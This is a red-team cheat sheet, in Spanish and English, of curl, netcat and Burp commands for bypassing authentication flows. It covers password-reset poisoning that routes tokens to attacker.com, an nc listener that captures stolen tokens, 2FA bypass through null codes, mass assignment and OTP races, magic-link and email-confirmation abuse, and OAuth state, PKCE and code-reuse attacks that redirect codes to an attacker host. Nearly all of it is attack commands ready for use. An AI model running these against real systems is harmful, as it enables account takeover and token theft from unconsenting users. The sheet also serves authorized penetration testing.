---
aliases:
  - Password Reset Bypass
  - 2FA Bypass
  - Magic Link Reuse
  - OAuth State Missing
tags:
  - vuln/auth-bypass
  - technique/credential-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Authentication & Authorization Bypass]]"
  - "[[Race Conditions]]"
  - "[[Host Header Injection]]"
---
# Auth Bypass - Flow Logic Flaws

---

## Password Reset Bypass / Token Leak

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "email=victim@target.com" https://target.com/forgot` | HHI reset poisoning — email link a attacker | Backend trusts XFH. |
| `nc -lvnp 80` en attacker.com → recibe `GET /reset?token=...` | Listener captura token | Setup phishing. |
| `curl https://target/reset?token=$STOLEN -d "password=ATTACKER"` | Replay token contra legit endpoint | Final ATO step. |
| `curl https://target/reset?token=$STOLEN_TOKEN` (repetido 5 veces) | Test single-use enforcement | Reuse vector check. |
| `curl https://target/reset?token=$OLD_TOKEN` con token de semanas pasadas | Test token expiry | No-expiry persistence. |
| `curl -X POST -d "email=victim@target.com&password=ATTACKER" https://target/reset` (sin token) | Endpoint sin token validation | Direct missing-auth. |
| `curl -X POST -d "user_id=2&password=ATTACKER" https://target/reset` | IDOR + reset combo | Token tied to user_id. |
| `curl -X POST -H "Cookie: $C" -d "email=victim@target.com" https://target/forgot \| jq .token` | Token disclosed en response body | Info disclosure. |
| Burp Repeater group `POST /reset {token: $T}` × 100 parallel | Race condition en token consume | Race + reuse. |
| `curl -X POST -d "email=victim@target.com,attacker@evil.com" https://target/forgot` | Multi-recipient via email injection | SMTP injection adjacent. |
^auth-flow-reset

---

## 2FA Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Cookie: $C" -d '{"code":""}' https://target/api/2fa/verify` | Empty code bypass | Backend acepta vacío. |
| `curl -X POST -H "Cookie: $C" -d '{"code":null}' https://target/api/2fa/verify` | Null code bypass | Null treated as valid. |
| `curl -X POST -H "Cookie: $C" -d '{"code":"123456","verified":true}' https://target/api/2fa/verify` | Flag injection en body | Mass Assignment 2FA. |
| `curl -H "Cookie: $C_PRE_2FA" https://target/dashboard` | Direct forced browsing post-login pre-2FA | Session marked authenticated pre-2FA. |
| Burp Intruder con `?code=FUZZ` y wordlist `0000-9999` | OTP brute con rate limit defeated | Sin rate limit / weak limit. |
| Burp Repeater group `POST /verify {code}` × 100 single connection HTTP/2 | OTP brute via race condition | Single-packet race. |
| `curl -X POST -H "Cookie: $C" -d '{"code":"$OLD_OTP"}' https://target/api/2fa/verify` | OTP reuse | Old OTP still valid. |
| `curl -X PATCH -H "Cookie: $C" -d '{"mfa_enabled":false}' https://target/api/users/me` | 2FA disable via Mass Assignment | Combine MA + 2FA. |
| `curl -H "Cookie: $C" https://target/api/v1/dashboard` (vs v2 que enforce 2FA) | API version differential | Old endpoint sin 2FA. |
| OAuth flow: `https://idp/oauth/authorize?...` (login as victim via OAuth) | OAuth bypasses 2FA del app | Federation skip MFA. |
| `curl -X POST -H "Cookie: $C" -d '{"code":"$BACKUP_CODE"}' https://target/api/2fa/verify` × 2 | Backup codes reuse | Single-use violated. |
^auth-flow-2fa

---

## Magic Link Reuse / Tampering

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl https://target/auth?token=$T` × 3 | Magic link single-use violated | Reuse vector. |
| `curl https://target/auth?token=$T` con token semanas viejo | No-expiry persistence | Token sin TTL. |
| `<img src="https://attacker.com/log">` en página víctima post-magic-link → Referer leak | Token leak via Referer | Cross-origin Referer. |
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "email=victim" https://target/login/magic` | HHI magic link poisoning | Email link a attacker. |
| Burp Repeater group `GET /auth?token=$T` × N parallel | Race condition en token consume | Race + reuse. |
| `curl https://target/auth?token=$T&user_id=2` (cambiar user_id) | IDOR + magic combo | Token + user_id no bound. |
| Wait for email scanner to click (Outlook ATP, Mimecast) → token consumed | Email scanner pre-consume | DoS variant. |
| `for token in $(generate_predictable_tokens); do curl -sI "https://target/auth?token=$token"; done` | Brute predictable magic tokens | Weak token generation. |
^auth-flow-magic

---

## Email Confirmation Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d '{"email":"victim@target.com","confirmed":true}' https://target/api/confirm` | Mass Assignment confirmed flag | Direct flag inject. |
| `curl -X PATCH -H "Cookie: $C" -d '{"email_verified":true}' https://target/api/users/me` | Self-set email_verified via MA | Profile update. |
| `curl https://target/confirm?token=$T` × 5 | Confirm token reuse | Single-use violated. |
| `curl https://target/confirm?token=$T&user_id=2` (cambiar user_id) | IDOR + confirm combo | Token + user_id no bound. |
| Login pre-confirm: `curl -X POST -d "email=test&password=x" https://target/login` (cuenta no verificada) | App permite login antes de email confirm | Logic flaw. |
| `curl https://target/api/v1/confirm?token=$T` vs `curl https://target/api/v2/confirm?token=$T` | Endpoint version differential | Per-version. |
| `curl -X POST -H "X-Email-Verified: true" -H "Cookie: $C" https://target/restricted` | Header trust spoof | Custom header trust. |
| OAuth signup con email victim: Google con `victim@target.com` unverified → signup en target con Google → server crea cuenta con email víctima | Pre-account takeover via OAuth | App no verifica `email_verified` claim. |
^auth-flow-email-confirm

---

## OAuth State / Nonce Missing

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://idp/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email"` (sin `state`) | State omission → CSRF posible | Server no exige state. |
| `curl -sI "https://target/cb?code=AAA"` (sin state param) | Callback acepta sin state validation | Validation absent. |
| `curl -sI "https://idp/oauth/authorize?...&state=anything"` | State presence-only validation | Fake validation. |
| `curl -X POST -d "code=$STOLEN&client_id=APP&redirect_uri=https://attacker/cb" https://idp/oauth/token` (replay 2x) | Code reuse single-use violated | Spec violation. |
| `curl -X POST -d "code=$CODE&client_id=B" https://idp/oauth/token` (cliente B con code de A) | Cross-client code substitution | Code no bound a client_id. |
| `curl -X POST -d "code=$CODE&redirect_uri=https://attacker/cb&client_id=APP" https://idp/oauth/token` (sin code_verifier) | PKCE bypass | Server no enforce PKCE. |
| `curl -sI "https://idp/oauth/authorize?response_type=token&..."` | Implicit flow habilitado — token directo | Legacy support. |
| `<img src="https://idp/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://attacker/cb&state=ATTACKER">` | Login CSRF — víctima auth con código atacante intercepta | State no bound a víctima session. |
| `curl -sI "https://idp/oauth/authorize?...&prompt=none"` | Silent re-auth | Sesión preexistente bypass. |
^auth-flow-oauth-state

---

## Race Conditions en Auth

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater group `POST /login {user, pass}` × 50 parallel single conn HTTP/2 | Bypass rate limit via race | Login race. |
| Burp Intruder con Turbo Intruder + `concurrentConnections=1, engine=Engine.BURP2` | OTP brute via HTTP/2 single-packet | Modern race. |
| `for i in {1..100}; do curl -X POST -H "Cookie: $C" -d "code=123456" https://target/api/2fa/verify & done; wait` | Bash parallel OTP race | Quick test. |
| Burp Repeater group `POST /reset {token: $T}` × 100 parallel | Reset token reuse race | Token consume race. |
| Burp Repeater group `POST /signup {username: alice}` × 50 parallel | Account creation race — username collision | Parallel signups. |
| Burp Repeater group `POST /2fa/setup + POST /2fa/skip` parallel | 2FA enrollment race | Setup + bypass simultáneos. |
| Burp Repeater group `POST /password/change {old, new}` × 50 con wrong old | Password change race sin verify old | Atomic check missing. |
| Turbo Intruder script con `engine=Engine.BURP2, concurrentConnections=1` para login attempts | HTTP/2 single-packet race | Volume + sync. |
^auth-flow-race

---
